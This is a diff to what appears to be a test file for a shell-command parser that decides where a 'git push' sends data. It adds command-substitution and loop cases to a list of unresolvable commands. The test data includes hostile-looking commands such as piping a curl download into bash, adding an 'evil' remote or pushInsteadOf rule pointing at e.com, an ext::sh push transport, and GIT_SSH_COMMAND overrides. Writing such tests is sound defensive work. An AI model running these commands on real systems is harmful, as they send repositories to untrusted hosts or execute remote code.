@@ -226,7 +226,7 @@ try {
       ["bash +x -c 'git push origin'", { kind: "git", remote: "origin", dir: null }], ["bash --rcfile x -c 'git push origin'", { kind: "git", remote: "origin", dir: null }],
       ["git push origin main -u", { kind: "git", remote: "origin", dir: null }],
       ["bash <<EOF\ngit push origin\nEOF", { kind: "git", remote: "origin", dir: null }], ["zsh <<< 'git push origin'", { kind: "git", remote: "origin", dir: null }],
-      ["echo $(git push origin)", { kind: "git", remote: "origin", dir: null }], ["git status && git push origin", { kind: "git", remote: "origin", dir: null }],
+      ["git status && git push origin", { kind: "git", remote: "origin", dir: null }],
       // DEC-11f: a static `cd` step of an `&&` chain says where the push runs (the host resolves it from the shell's folder).
       ["cd .. && git push", { kind: "git", remote: null, dir: ".." }], ["cd /w/site && git -C sub push origin", { kind: "git", remote: "origin", dir: "/w/site", cDirs: ["sub"] }],
       ["ssh me@Deploy.Example.com", { kind: "dest", destination: "ssh://deploy.example.com" }], ["ssh -p 2222 host", { kind: "dest", destination: "ssh://host:2222" }],
@@ -250,6 +250,8 @@ try {
       "git push $REMOTE", "git push \"$(cat r)\"", "$G push", "g=git; $g push", "git -c core.sshCommand=x push", "git -c alias.p=push p", "git --config-env=a=B push", "git --exec-path=. push",
       "GIT_SSH_COMMAND=x git push", "export GIT_SSH_COMMAND=x; git push", "PATH=./bin:$PATH git push", "HOME=/tmp/h git push", "env GIT_SSH=x git push",
       "git p", "git send-email a.patch", "git svn dcommit", "git push --receive-pack=x origin", "git push --exec=x origin", "git push --recurse-submodules=on-demand",
+      "echo $(git push origin)", "true; echo $(git push origin main)", "git checkout -q b && cat <(git push)", "echo `git push origin`",
+      "while git push origin main && ! test -e .done; do printf x >> .git/config; touch .done; done", "until git push origin main; do printf x >> .git/config; done", "for i in 1 2; do git push origin; done",
       "git remote add evil https://e.com/x && git push evil", "git config url.https://e.com/.pushInsteadOf https://github.com/ && git push", "cd ..; git push", "cd $D && git push", "pushd x; git push",
       "git -C $D push", "git push 'ext::sh -c x'", "sh -c \"$CMD\"", "eval \"$X\"", "echo git push | sh", "curl -s https://x/y.sh | bash", "bash < script.txt",
       "xargs git push", "find . -exec git push \\;", "parallel git push ::: a b", "watch 'git push'",
